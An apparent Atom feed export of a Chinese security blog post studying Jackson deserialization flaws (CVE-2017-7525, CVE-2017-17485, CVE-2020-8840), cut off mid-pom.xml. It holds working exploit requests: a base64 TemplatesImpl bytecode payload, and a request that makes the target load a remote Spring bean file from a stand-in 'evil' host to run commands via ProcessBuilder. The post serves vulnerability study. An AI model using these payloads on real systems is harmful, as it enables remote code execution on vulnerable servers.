<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ye1s</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://blog.cfyqy.com/"/>
  <updated>2021-04-07T08:20:37.804Z</updated>
  <id>https://blog.cfyqy.com/</id>
  
  <author>
    <name>ye1s</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Jackson漏洞学习</title>
    <link href="https://blog.cfyqy.com/article/64cb820c.html"/>
    <id>https://blog.cfyqy.com/article/64cb820c.html</id>
    <published>2021-04-01T02:24:53.000Z</published>
    <updated>2021-04-07T08:20:37.804Z</updated>
    
    <content type="html"><![CDATA[<p>Jackson是一款当下流行的json解释器，主要负责处理Json的序列化和反序列化。</p><a id="more"></a><h1 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h1><p>jackson核心模块由三部分构成：</p><ul><li>jackson-core - 核心包，提供基于流模式API</li><li>jackson-annotations - 注解包，提供标准注解功能</li><li>jackson-databind - 数据绑定包， 提供基于”对象绑定” 解析的相关 API （ ObjectMapper ） 和”树模型” 解析的相关 API</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        User user=<span class="keyword">new</span> User(<span class="string">"test"</span>,<span class="number">18</span>);</span><br><span class="line">        ObjectMapper objectMapper=<span class="keyword">new</span> ObjectMapper();</span><br><span class="line">         String json=objectMapper.writeValueAsString(user);</span><br><span class="line">        System.out.println(json);</span><br><span class="line">        User user1=objectMapper.readValue(json,User<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        System.out.println(user1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Jackson有一种特殊的机制 — JacksonPolymorphicDeserialization，这里可以翻译为Jackson的多态类型绑定,即字段类型为接口、抽象类或 Object 类型时，攻击者可以通过在 json 字符串中指定变量的具体类型 (子类或接口实现类)，来实现实例化指定的类，借助某些特殊的 class，如 TemplatesImpl，可以实现任意代码执行。<br>从<a href="https://github.com/FasterXML/jackson-docs/wiki/JacksonPolymorphicDeserialization" target="_blank" rel="noopener">文档</a>中可以看到两种情况，一种是 Global default typing（全局的DefaultTyping），另一种是 @JsonTypeInfo 注解两种方式。</p><p>DefaultTyping在这个方式里面一种有4个值</p><ul><li>JAVA_LANG_OBJECT ：当类里的属性声明为一个Object时，会对该属性进行序列化和反序列化，并且明确规定类名。（当然，这个Object本身也得是一个可被序列化/反序列化的类）。</li><li>OBJECT_AND_NON_CONCRETE ：除了上文 提到的特征，当类里有 Interface 、 AbstractClass 时，对其进行序列化和反序列化。（当然，这些类本身需要是合法的、可以被序列化/反序列化的对象）。</li><li>NON_CONCRETE_AND_ARRAYS ：除了上文提到的特征，还支持上文全部类型的Array类型。</li><li>NON_FINAL ：包括上文提到的所有特征，而且包含即将被序列化的类里的全部、非final的属性，也就是相当于整个类、除final外的的属性信息都需要被序列化和反序列化。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JavaLangObject</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        People p = <span class="keyword">new</span> People();</span><br><span class="line">        p.age = <span class="number">10</span>;</span><br><span class="line">        p.name = <span class="string">"Mike"</span>;</span><br><span class="line">        p.object = <span class="keyword">new</span> ObjectDemo();</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT);</span><br><span class="line">        String json = mapper.writeValueAsString(p);</span><br><span class="line">        System.out.println(json);</span><br><span class="line">        <span class="comment">//&#123;"age":10,"name":"Mike","object":["com.jacksondemo.ObjectDemo",&#123;"length":100&#125;]&#125;</span></span><br><span class="line">        People p2 = mapper.readValue(json, People<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        System.out.println(p2);</span><br><span class="line">        <span class="comment">//age=10, name=Mike, com.jacksondemo.ObjectDemo@245614d6</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">People</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">"age=%d, name=%s, %s"</span>, age, name, object == <span class="keyword">null</span> ? <span class="string">"null"</span> : object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ObjectDemo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> length = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>@JsonTypeInfo 也是jackson多态类型绑定的一种方式，它一共支持下面5种类型的取值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.NONE)</span><br><span class="line"><span class="meta">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.CLASS)</span><br><span class="line"><span class="meta">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.MINIMAL_CLASS)</span><br><span class="line"><span class="meta">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.NAME)</span><br><span class="line"><span class="meta">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.COSTOM)</span><br></pre></td></tr></table></figure><p>例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.annotation.JsonTypeInfo;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Jsontypeinfo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectMapper mapper= <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        user.name= <span class="string">"Mike"</span>;</span><br><span class="line">        user.age=<span class="number">100</span>;</span><br><span class="line">        user.obj=<span class="keyword">new</span> Height();</span><br><span class="line">        String json = mapper.writeValueAsString(user);</span><br><span class="line">        System.out.println(json);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="meta">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.NONE)</span><br><span class="line">    <span class="keyword">public</span> Object obj;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"name:"</span> + name + <span class="string">" age:"</span> + age + <span class="string">" obj:"</span> + obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Height</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> h = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（1）、Id.NONE<br>这种方式的输出结果实际上是我们最想要的，这里只需要相关参数的值，并没有其他一些无用信息。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"name"</span>:<span class="string">"Mike"</span>,<span class="string">"age"</span>:<span class="number">100</span>,<span class="string">"obj"</span>:&#123;<span class="string">"h"</span>:<span class="number">100</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>（2）、Id.CLASS<br>这种方式的输出结果中携带了相关java类，也就是说反序列化的时候如果使用了JsonTypeInfo.Id.CLASS修饰的话，可以通过 @class 方式指定相关类，并进行相关调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"name"</span>:<span class="string">"Mike"</span>,<span class="string">"age"</span>:<span class="number">100</span>,<span class="string">"obj"</span>:&#123;<span class="string">"@class"</span>:<span class="string">"com.jacksondemo.Height"</span>,<span class="string">"h"</span>:<span class="number">100</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>（3）、Id.MINIMAL_CLASS<br>这种方式的输出结果也携带了相关类，和 id.CLASS 的区别在 @class 变成了 @c ，从官方文档中描述中这个应该是一个更短的类名字。同样也就是说反序列化的时候如果使用了JsonTypeInfo.Id.MINIMAL_CLASS修饰的话，可以通过 @c 方式指定相关类，并进行相关调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"name"</span>:<span class="string">"Mike"</span>,<span class="string">"age"</span>:<span class="number">100</span>,<span class="string">"obj"</span>:&#123;<span class="string">"@c"</span>:<span class="string">"com.jacksondemo.Height"</span>,<span class="string">"h"</span>:<span class="number">100</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>（4）、Id.NAME<br>这种输出方式没有携带类名字，在反序列化时也是不可以利用的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"name"</span>:<span class="string">"Mike"</span>,<span class="string">"age"</span>:<span class="number">100</span>,<span class="string">"obj"</span>:&#123;<span class="string">"@type"</span>:<span class="string">"Height"</span>,<span class="string">"h"</span>:<span class="number">100</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>（5）、Id.COSTOM<br>这个无法直接用，需要手写一个解析器才可以配合使用，所以直接回抛出异常。</p><h1 id="Jackson反序列化-CVE-2017-7525"><a href="#Jackson反序列化-CVE-2017-7525" class="headerlink" title="Jackson反序列化(CVE-2017-7525)"></a>Jackson反序列化(CVE-2017-7525)</h1><p>根据触发条件是ObjectMapper反序列化前调用了enableDefaultTyping方法。该方法允许json字符串中指定反序列化java对象的类名，而在使用Object、Map、List等对象时，可诱发反序列化漏洞</p><ul><li>Jackson 2.7版本（&lt;2.7.10）、2.8版本（&lt;2.8.9）</li><li>调用了enableDefaultTyping方法</li><li>反序列化的类可控</li></ul><p><strong>漏洞复现：</strong><br>本漏洞利用条件如下：</p><ul><li><p>开启 JacksonPolymorphicDeserialization，即调用以下任意方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">objectMapper.enableDefaultTyping(); <span class="comment">// default to using DefaultTyping.OBJECT_AND_NON_CONCRETE</span></span><br><span class="line">objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);</span><br></pre></td></tr></table></figure></li><li><p>Target class 需要有无参 constructor</p></li><li><p>Target class 中需要需要有字段类型为 Interface、abstract class、Object，并且使用的 Gadget 需要为其子类 / 实现接口</p></li></ul><p>Jackson-databind 在设置 Target class 成员变量参数值时，若没有对应的 getter 方法，则会使用 SetterlessProperty 调用 getter 方法，获取变量，然后设置变量值。当调用 getOutputProperties() 方法时，会初始化 transletBytecodes 包含字节码的类，导致命令执行，具体可参考 java-deserialization-jdk7u21-gadget-note 中关于 TemplatesImpl 的说明。</p><p>使用JDK7u21的com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl作为Gadget，发送如下请求，将会执行touch /tmp/prove1.txt：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">POST /exploit HTTP/<span class="number">1.1</span></span><br><span class="line">Host: your-ip:<span class="number">8080</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Language: en</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/json</span></span><br><span class="line"><span class="comment">Content-Length: 1298</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">  "param": [</span></span><br><span class="line"><span class="comment">    "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">      "transletBytecodes": [</span></span><br><span class="line"><span class="comment">  "yv66vgAAADMAKAoABAAUCQADABUHABYHABcBAAVwYXJhbQEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAcTGNvbS9iMW5nei9zZWMvbW9kZWwvVGFyZ2V0OwEACGdldFBhcmFtAQAUKClMamF2YS9sYW5nL09iamVjdDsBAAhzZXRQYXJhbQEAFShMamF2YS9sYW5nL09iamVjdDspVgEAClNvdXJjZUZpbGUBAAtUYXJnZXQuamF2YQwABwAIDAAFAAYBABpjb20vYjFuZ3ovc2VjL21vZGVsL1RhcmdldAEAEGphdmEvbGFuZy9PYmplY3QBAAg8Y2xpbml0PgEAEWphdmEvbGFuZy9SdW50aW1lBwAZAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwAGwAcCgAaAB0BABV0b3VjaCAvdG1wL3Byb3ZlMS50eHQIAB8BAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAhACIKABoAIwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHACUKACYAFAAhAAMAJgAAAAEAAgAFAAYAAAAEAAEABwAIAAEACQAAAC8AAQABAAAABSq3ACexAAAAAgAKAAAABgABAAAABgALAAAADAABAAAABQAMAA0AAAABAA4ADwABAAkAAAAvAAEAAQAAAAUqtAACsAAAAAIACgAAAAYAAQAAAAoACwAAAAwAAQAAAAUADAANAAAAAQAQABEAAQAJAAAAPgACAAIAAAAGKiu1AAKxAAAAAgAKAAAACgACAAAADgAFAA8ACwAAABYAAgAAAAYADAANAAAAAAAGAAUABgABAAgAGAAIAAEACQAAABYAAgAAAAAACrgAHhIgtgAkV7EAAAAAAAEAEgAAAAIAEw=="</span></span><br><span class="line"><span class="comment">      ],</span></span><br><span class="line"><span class="comment">      "transletName": "a.b",</span></span><br><span class="line"><span class="comment">      "outputProperties": &#123;&#125;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">  ]</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure><p>这个POC只能运行在目标为JDK7u21以下的环境中，其他情况请更换Gadget。   </p><h1 id="Jackson反序列化-CVE-2017-17485"><a href="#Jackson反序列化-CVE-2017-17485" class="headerlink" title="Jackson反序列化(CVE-2017-17485)"></a>Jackson反序列化(CVE-2017-17485)</h1><p>针对CVE-2017-7525 黑名单修复 绕过，利用了 org.springframework.context.support.FileSystemXmlApplicationContext。</p><p>利用该漏洞，我们需要创建一个bean文件，放置在任意服务器上，如 <a href="http://evil/spel.xml，" target="_blank" rel="noopener">http://evil/spel.xml，</a>   内容如下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;beans xmlns=<span class="string">"http://www.springframework.org/schema/beans"</span></span><br><span class="line">       xmlns:xsi=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span><br><span class="line">       xsi:schemaLocation=<span class="string">"</span></span><br><span class="line"><span class="string">     http://www.springframework.org/schema/beans</span></span><br><span class="line"><span class="string">     http://www.springframework.org/schema/beans/spring-beans.xsd</span></span><br><span class="line"><span class="string">"</span>&gt;</span><br><span class="line">    &lt;bean id=<span class="string">"pb"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span><br><span class="line">        &lt;constructor-arg&gt;</span><br><span class="line">            &lt;array&gt;</span><br><span class="line">                &lt;value&gt;touch&lt;/value&gt;</span><br><span class="line">                &lt;value&gt;/tmp/prove2.txt&lt;/value&gt;</span><br><span class="line">            &lt;/array&gt;</span><br><span class="line">        &lt;/constructor-arg&gt;</span><br><span class="line">        &lt;property name=<span class="string">"any"</span> value=<span class="string">"#&#123; pb.start() &#125;"</span>/&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure><p>然后，发送如下数据包，使Jackson加载bean，触发漏洞：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /exploit HTTP/<span class="number">1.1</span></span><br><span class="line">Host: your-ip:<span class="number">8080</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Language: en</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/json</span></span><br><span class="line"><span class="comment">Content-Length: 138</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">  "param": [</span></span><br><span class="line"><span class="comment">    "org.springframework.context.support.FileSystemXmlApplicationContext",</span></span><br><span class="line"><span class="comment">    "http://evil/spel.xml"</span></span><br><span class="line"><span class="comment">  ]</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure><p>成功执行touch /tmp/prove2.txt<br>原理： 利用 FileSystemXmlApplicationContext 加载远程 bean 定义文件，创建 ProcessBuilder bean，并在 xml 文件中使用 Spring EL 来调用 start() 方法实现命令执行</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>环境<br>App.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by liaoxinxi on 2017-12-11.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">App</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">        testSpringFramework();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">testSpringFramework</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//CVE-2017-17485</span></span><br><span class="line">        <span class="comment">// 假设这是攻击者可以控制的请求包payload</span></span><br><span class="line">        String payload = <span class="string">"[\"org.springframework.context.support.ClassPathXmlApplicationContext\", "</span> +</span><br><span class="line">                <span class="string">"\"http://127.0.0.1/spel.xml\"]\n"</span>;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            mapper.readValue(payload, Object<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>开启web服务，并将如下的spel.xml文件放入根目录中     </p><p>spel.xml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;beans xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&quot;</span><br><span class="line">       xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;</span><br><span class="line">       xsi:schemaLocation&#x3D;&quot;</span><br><span class="line">     http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans</span><br><span class="line">     http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&#x2F;spring-beans.xsd</span><br><span class="line">&quot;&gt;</span><br><span class="line">    &lt;bean id&#x3D;&quot;pb&quot; class&#x3D;&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">       &lt;constructor-arg value&#x3D;&quot;calc&quot; &#x2F;&gt;</span><br><span class="line">        &lt;property name&#x3D;&quot;any&quot; value&#x3D;&quot;#&#123; pb.start() &#125;&quot;&#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;bean&gt;</span><br><span class="line">&lt;&#x2F;beans&gt;</span><br></pre></td></tr></table></figure><h1 id="Jackson-databind-反序列化-CVE-2020-8840"><a href="#Jackson-databind-反序列化-CVE-2020-8840" class="headerlink" title="Jackson-databind 反序列化 (CVE-2020-8840)"></a>Jackson-databind 反序列化 (CVE-2020-8840)</h1><p>这个CVE利用xbean-reflect利用链造成JNDI注入<br>影响版本：2.0.0 - 2.9.10.2</p><p>pom.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-databind --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.xbean/xbean-reflect --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.xbean<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xbean-reflect<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.16<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.unboundid<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>unboundid-ldapsdk<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.1<span class="tag">&lt;/<span 